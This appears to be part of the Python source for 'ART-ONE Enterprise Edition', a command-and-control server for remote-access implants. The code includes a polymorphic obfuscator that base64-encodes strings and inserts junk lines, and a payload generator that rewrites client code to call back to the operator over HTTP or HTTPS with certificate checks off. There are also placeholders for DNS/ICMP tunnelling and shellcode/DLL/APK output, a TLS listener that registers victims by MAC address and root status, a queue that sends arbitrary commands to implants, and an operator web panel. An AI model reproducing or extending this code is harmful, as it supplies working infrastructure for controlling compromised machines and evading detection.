            f"{generate_random_name()} = lambda x: x * {random.randint(1, 10)}"
        ]
        lines = obfuscated_code.splitlines()
        for i in range(0, len(lines), 3):
            if i < len(lines):
                lines.insert(i, random.choice(junk_lines))

        # Encode strings with random encoding schemes
        final_code = "\n".join(lines)
        final_code = re.sub(r'"([^"]*)"', lambda m: f'"base64.b64decode(\'{base64.b64encode(m.group(1).encode()).decode()}\').decode()"', final_code)
        final_code = re.sub(r"'([^']*)'", lambda m: f"'base64.b64decode(\'{base64.b64encode(m.group(1).encode()).decode()}\').decode()'", final_code)

        # Add imports if necessary
        if "import base64" not in final_code:
            final_code = "import base64\n" + final_code
        if "import random" not in final_code:
            final_code = "import random\n" + final_code

        return final_code
    except Exception as e:
        colored_print(f"[!] Error in polymorphic obfuscation: {e}", "error")
        return advanced_obfuscate_python(code)

def generate_payload_code(base_code: str, format_type: str, comm_protocol: str) -> str:
    """
    Modifies the base client code to support different payload formats and communication protocols.
    This is a simplified implementation; you may need to expand it for production use.
    """
    if comm_protocol != "tcp":
        # Modify the connection logic based on the protocol (simplified)
        if comm_protocol == "http":
            base_code = base_code.replace("socket.create_connection((SERVER_IP, SERVER_PORT))", 
                                         "requests.get(f'http://{SERVER_IP}:{SERVER_PORT}/connect', headers={'Agent-ID': str(uuid.getnode())})")
            base_code = "import requests\n" + base_code
        elif comm_protocol == "https":
            base_code = base_code.replace("socket.create_connection((SERVER_IP, SERVER_PORT))", 
                                         "requests.get(f'https://{SERVER_IP}:{SERVER_PORT}/connect', headers={'Agent-ID': str(uuid.getnode())}, verify=False)")
            base_code = "import requests\n" + base_code
        elif comm_protocol == "dns":
            base_code = base_code.replace("with socket.create_connection((SERVER_IP, SERVER_PORT)) as s:", 
                                         "# DNS Tunneling placeholder\npass")
            base_code = "# DNS Tunneling not fully implemented\n" + base_code
        elif comm_protocol == "icmp":
            base_code = base_code.replace("with socket.create_connection((SERVER_IP, SERVER_PORT)) as s:", 
                                         "# ICMP Tunneling placeholder\npass")
            base_code = "# ICMP Tunneling not fully implemented\n" + base_code

    if format_type != "script":
        # For non-script formats, we return a placeholder (in reality, you'd need to compile or transform the code)
        if format_type == "executable":
            return "# Placeholder: Compile to executable\n" + base_code
        elif format_type == "apk":
            return "# Placeholder: Generate APK\n" + base_code
        elif format_type == "shellcode":
            return "# Placeholder: Convert to shellcode\n" + base_code
        elif format_type == "dll":
            return "# Placeholder: Compile to DLL\n" + base_code

    return base_code

def encrypt_data(data: str, key: bytes) -> bytes:
    """
    Encrypts data using AES-256 in CBC mode.
    """
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    # Pad data to be a multiple of 16 bytes
    padding_length = 16 - (len(data) % 16)
    padded_data = data + (chr(padding_length) * padding_length)
    encrypted = encryptor.update(padded_data.encode()) + encryptor.finalize()
    return iv + encrypted

def decrypt_data(encrypted_data: bytes, key: bytes) -> str:
    """
    Decrypts data using AES-256 in CBC mode.
    """
    iv = encrypted_data[:16]
    ciphertext = encrypted_data[16:]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_padded = decryptor.update(ciphertext) + decryptor.finalize()
    padding_length = decrypted_padded[-1]
    decrypted = decrypted_padded[:-padding_length].decode()
    return decrypted

async def on_new_connection(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    global NEXT_CLIENT_ID, CLIENTS
    address = writer.get_extra_info("peername")
    colored_print(f"[!] Secure connection attempt from {address}", "success")
    ip = address[0]
    await insert_log("general", "", f"Secure connection attempt from {address}", "")
    if ip in (await get_blacklist()):
        colored_print(f"[!] Blacklisted IP: {ip}", "block")
        writer.close()
        await writer.wait_closed()
        return
    try:
        raw = await reader.read(int((await get_config()).get("BUFFER_SIZE", "16384")))
        system_info = json.loads(raw.decode())
        system_info["client_port"] = address[1]
    except Exception as e:
        colored_print(f"[!] Error receiving client info: {e}", "error")
        await insert_log("general", "", f"Error receiving client info: {e} from {address}", "")
        if not await handle_failed_connection(ip):
            colored_print(f"[!] IP {ip} added to blacklist due to repeated failed connection attempts", "block")
        writer.close()
        await writer.wait_closed()
        return
    await reset_failed_attempt(ip)

    existing = None
    for client_id, client in CLIENTS.items():
        if client.info.get("MDRS") == system_info.get("MDRS"):
            if not client.info.get("IDM", False) and system_info.get("IDM", False):
                colored_print(f"[!] Forcing replacement: existing non-root client for MAC {system_info.get('MDRS')}", "warning")
                try:
                    client.writer.close()
                    await client.writer.wait_closed()
                except:
                    pass
                del CLIENTS[client_id]
                existing = client_id
                break
            else:
                existing = client_id
                break

    if existing is None:
        async with aiosqlite.connect(DB_FILE) as db:
            async with db.execute("SELECT client_id FROM clients WHERE json_extract(info, '$.MDRS') = ?", (system_info.get("MDRS"),)) as cursor:
                row = await cursor.fetchone()
                if row:
                    existing = row[0]

    if existing is None:
        NEXT_CLIENT_ID += 1
        client_id = NEXT_CLIENT_ID
    else:
        client_id = existing

    sess = ClientSession(reader, writer, client_id)
    sess.info = system_info
    sess.online = True
    CLIENTS[client_id] = sess
    await insert_or_update_client(client_id, ip, system_info, True)
    await insert_log("general", "", f"Client {client_id} connected from {address}", "")
    colored_print(f"[+] Client {client_id} connected: {address}", "connected")
    asyncio.create_task(handle_client_session(sess))
    asyncio.create_task(broadcast_clients_update())

async def handle_failed_connection(ip: str) -> bool:
    attempts = await get_failed_attempts()
    count = attempts.get(ip, 0) + 1
    await set_failed_attempt(ip, count)
    if count >= 3:
        await add_blacklist(ip, "Excessive failed connection attempts to C2")
        await reset_failed_attempt(ip)
        return False
    return True

async def handle_client_session(sess: ClientSession):
    try:
        while sess.online:
            cmd_obj = await sess.commands_queue.get()
            if cmd_obj is None:
                break
            command_text = cmd_obj.text
            try:
                async with sess.write_lock:
                    sess.writer.write((command_text + "\n").encode())
                    await sess.writer.drain()
                async with sess.read_lock:
                    length_line = await _readline(sess.reader)
                    if length_line is None:
                        raise Exception("Socket closed while reading length_line")
                    total_length = int(length_line.strip())
                    data = await sess.reader.readexactly(total_length)
                response_text = data.decode(errors='replace')
                await insert_log("client", sess.info.get("MDRS", "unknown"), command_text, response_text)
                cmd_obj.future.set_result(response_text)
            except Exception as e:
                await insert_log("general", "", f"Error executing command '{command_text}' on client {sess.id}: {e}", "")
                cmd_obj.future.set_exception(e)
    except Exception as e:
        colored_print(f"[!] Error with client {sess.id}: {e}", "error")
        await insert_log("general", "", f"Error with client {sess.id}: {e}", "")
    finally:
        sess.online = False
        try:
            sess.writer.close()
            await sess.writer.wait_closed()
        except:
            pass
        if sess.id in CLIENTS:
            del CLIENTS[sess.id]
        await insert_or_update_client(sess.id, sess.address[0], sess.info, False)
        await insert_log("general", "", f"Client {sess.id} disconnected.", "")
        asyncio.create_task(broadcast_clients_update())

async def _readline(reader: asyncio.StreamReader):
    line = b""
    while True:
        chunk = await reader.read(1)
        if not chunk:
            return line if line else None
        if chunk == b"\n":
            break
        line += chunk
    return line

async def monitor_clients():
    while True:
        await asyncio.sleep(random.randint(20, 40))
        for cid, sess in list(CLIENTS.items()):
            if not sess.online:
                continue
            try:
                async with sess.write_lock:
                    sess.writer.write(b"BaNdErOlA\n")
                    await sess.writer.drain()
            except (BrokenPipeError, ConnectionResetError, asyncio.CancelledError, OSError):
                sess.online = False
                try:
                    sess.writer.close()
                    await sess.writer.wait_closed()
                except:
                    pass
                ip, port = sess.address if sess.address else ("unknown", "unknown")
                colored_print(f"[-] Client {cid} disconnected (IP: {ip}, Port: {port})", "error")
                await insert_log("general", "", f"Client {cid} disconnected. (IP: {ip}, Port: {port})", "")

# ---------------------------
# ARRANQUE DEL SERVIDOR
# ---------------------------
def open_browser():
    webbrowser.open(f"http://127.0.0.1:{(asyncio.run(get_config())).get('PANEL_PORT', '4135')}")

@app.before_serving
async def startup_tasks():
    await init_db()
    await init_next_client_id()
    await register_self()
    asyncio.create_task(c2_main())
    asyncio.create_task(monitor_clients())
    asyncio.create_task(check_license_revocation_periodically())
    asyncio.create_task(run_scheduled_playbooks())

async def c2_main():
    config = await get_config()
    domain = config.get("SERVER_IP", "artone.site")  # Fallback to artone.site if not set
    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_ctx.minimum_version = ssl.TLSVersion.TLSv1_3
    cert_path = f"/etc/letsencrypt/live/{domain}/fullchain.pem"
    key_path = f"/etc/letsencrypt/live/{domain}/privkey.pem"
    try:
        ssl_ctx.load_cert_chain(certfile=cert_path, keyfile=key_path)
    except FileNotFoundError:
        colored_print(f"[!] SSL certificates not found at {cert_path} or {key_path}. Ensure Certbot has generated them.", "error")
        raise
    server = await asyncio.start_server(
        on_new_connection,
        host=config.get("SERVER_IP"),
        port=int(config.get("SERVER_PORT")),
        ssl=ssl_ctx
    )
    colored_print(f"[+] Async TLS server listening on {config.get('SERVER_IP')}:{config.get('SERVER_PORT')}", "success")
    async with server:
        await server.serve_forever()

def main():
    console = Console()
    console.clear()
    console.print(Panel(
        Text(
            "    ___    ____  ______    ____                ______      __                       _         \n"
            "   /   |  / __ \/_  __/   / __ \____  ___     / ____/___  / /____  _________  _____(_)_______ \n"
            "  / /| | / /_/ / / /_____/ / / / __ \/ _ \   / __/ / __ \/ __/ _ \/ ___/ __ \/ ___/ / ___/ _ \ \n"
            " / ___ |/ _, _/ / /_____/ /_/ / / / /  __/  / /___/ / / / /_/  __/ /  / /_/ / /  / (__  )  __/\n"
            "/_/  |_/_/ |_| /_/      \____/_/ /_/\___/  /_____/_/ /_/\__/\___/_/  / .___/_/  /_/____/\___/ \n"
            "                                                                    /_/                       \n"
            "ART-ONE ENTERPRISE EDITION\n"
            "Secure • Efficient • Reliable\n\n"
            "Created by:\n"
            "Adrián Gisbert - https://www.linkedin.com/in/sr-gisbert/ \n"
            "Ramón Frizat - https://www.linkedin.com/in/ramonfrizat/",
            justify="center",
            style="bold cyan"
        ),
        title="[bold magenta]🌟 ART-ONE ENTERPRISE EDITION 🌟[/bold magenta]",
        subtitle="[italic cyan]Version 2.2.1 | 2025[/italic cyan]",
        border_style="magenta",
        padding=(1, 2),
        expand=False,
        style="bold"
    ))

    asyncio.run(init_db())
    config = asyncio.run(get_config())
    domain = config.get("SERVER_IP", "artone.site")  # Fallback to artone.site if not set
    hyper_conf = HyperConfig()
    hyper_conf.bind = [f"{config.get('SERVER_IP')}:{config.get('PANEL_PORT')}"]
    hyper_conf.certfile = f"/etc/letsencrypt/live/{domain}/fullchain.pem"
    hyper_conf.keyfile = f"/etc/letsencrypt/live/{domain}/privkey.pem"
    try:
        if not os.path.exists(hyper_conf.certfile) or not os.path.exists(hyper_conf.keyfile):
            colored_print(f"[!] SSL certificates not found at {hyper_conf.certfile} or {hyper_conf.keyfile}. Ensure Certbot has generated them.", "error")
            raise FileNotFoundError("SSL certificates missing")
    except FileNotFoundError:
        raise
    colored_print(f"Starting QUART web on {config.get('SERVER_IP')}:{config.get('PANEL_PORT')}", "info")
    asyncio.run(hypercorn.asyncio.serve(app, hyper_conf))

if __name__ == "__main__":
    main()
